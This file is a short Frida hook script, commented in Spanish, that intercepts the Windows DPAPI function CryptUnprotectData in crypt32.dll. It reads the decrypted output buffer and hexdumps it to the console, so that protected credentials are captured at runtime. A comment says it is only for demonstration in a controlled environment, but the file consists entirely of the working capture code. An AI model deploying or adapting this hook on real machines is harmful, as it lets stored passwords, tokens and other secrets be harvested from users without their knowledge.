// Hook de Frida para captura de credenciales en runtime
// SOLO para demostracion en entorno controlado

Interceptor.attach(
    Module.findExportByName("crypt32.dll", "CryptUnprotectData"),
    {
        onLeave: function(retval) {
            if (retval.toInt32() !== 0) {
                // Lectura del DATA_BLOB de salida
                var pBlob = this.context.rsp.add(0x40).readPointer();
                var cbData = pBlob.readU32();
                var pbData = pBlob.add(8).readPointer();
                if (cbData > 0 && cbData < 4096) {
                    var data = pbData.readByteArray(cbData);
                    console.log("[DPAPI] Descifrado: " + cbData + " bytes");
                    console.log(hexdump(data, {
                        offset: 0, length: Math.min(cbData, 128),
                        header: true, ansi: true
                    }));
                }
            }
        }
    }
);
